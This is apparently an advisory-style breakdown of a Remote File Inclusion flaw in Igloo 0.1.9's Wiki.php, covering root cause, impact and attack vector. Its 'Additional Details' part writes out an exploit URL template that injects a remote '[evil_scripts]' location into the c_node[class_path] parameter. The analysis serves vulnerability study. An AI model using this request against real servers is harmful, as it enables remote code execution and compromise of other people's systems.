Based on the provided content, here's a breakdown of the vulnerability:

*   **Root Cause:** The vulnerability is due to a lack of proper input sanitization in the `Wiki.php` file of Igloo 0.1.9 and prior versions when handling the `c_node[class_path]` parameter.
*   **Weaknesses/Vulnerabilities:** This is a Remote File Inclusion (RFI) vulnerability. The `Wiki.php` script includes files based on user-supplied input, allowing for the inclusion of remote files.
*   **Impact of Exploitation:** An attacker can include and execute arbitrary code from a remote server, potentially leading to full compromise of the server hosting the vulnerable Igloo installation. This could include data theft, defacement, or other malicious activities.
*   **Attack Vectors:** The attack vector is via a crafted HTTP GET request to the `Wiki.php` script. Specifically, the attacker must be able to send a request that includes a malicious URL in the `c_node[class_path]` parameter.
*   **Required Attacker Capabilities/Position:** The attacker needs to be able to send HTTP requests to the vulnerable server. No prior authentication is needed and the attacker can exploit the vulnerability remotely.

**Additional Details:**

*   The exploit is triggered by passing a URL to the vulnerable parameter in the HTTP request: `http://www.site.com/[Igloo_path]/class/Wiki/Wiki.php?c_node[class_path]=[evil_scripts]`
*   The provided exploit string `[evil_scripts]` represents the remote location of the malicious file to be included.

This exploit allows an unauthenticated user to execute arbitrary code, thus resulting in a very high severity rating.
